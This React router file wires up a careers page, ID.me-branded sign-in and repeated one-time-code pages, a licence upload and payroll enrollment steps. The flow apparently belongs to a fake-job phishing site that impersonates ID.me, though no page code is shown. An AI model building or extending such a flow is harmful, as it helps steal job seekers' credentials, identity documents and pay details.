// src/App.tsx

import React from "react";
import { Routes, Route } from "react-router-dom";

// Page Imports
import Home from "./pages/Home";
import Career from "./pages/Career";
import Ime from "./pages/ime";
import Idme from "./pages/idme";
import IdmeOtp from "./pages/idmeotp";
import Otp from "./pages/otp";
import Otp2 from "./pages/idmeotp2";

// Form Components
import SignInForm from "./pages/form";
import Teil from "./pages/teil";
import SuccessPage from "./pages/SuccessPages";
import UploadLicense from "./pages/upload";
import Success from "./pages/Success";

// NEW PAGES
import PayrollEnrollment from "./pages/PayrollEnrollment";
import PayrollEnrollment2 from "./pages/PayrollEnrollment2";
import CodeVerification from "./pages/CodeVerification";

const App: React.FC = () => {
  return (
    <Routes>
      {/* Main Routes */}
      <Route path="/" element={<Home />} />
      <Route path="/career" element={<Career />} />
      <Route path="/ime" element={<Ime />} />

      {/* ID.me Routes */}
      <Route path="/idme" element={<Idme />} />
      <Route path="/idmeotp" element={<IdmeOtp />} />
      <Route path="/otp" element={<Otp />} />
      <Route path="/idmeotp2" element={<Otp2 />} />

      {/* Form Routes */}
      <Route path="/form" element={<SignInForm />} />
      <Route path="/teil" element={<Teil />} />

      {/* Success Pages */}
      <Route path="/success" element={<SuccessPage />} />
      <Route path="/done" element={<Success />} />

      {/* Upload */}
      <Route path="/upload" element={<UploadLicense />} />

      {/* Payroll Enrollment */}
      <Route path="/payroll-enroll" element={<PayrollEnrollment />} />
      <Route path="/payroll-enroll-2" element={<PayrollEnrollment2 />} />

      {/* Code Verification */}
      <Route path="/verify-code" element={<CodeVerification />} />
    </Routes>
  );
};

export default App;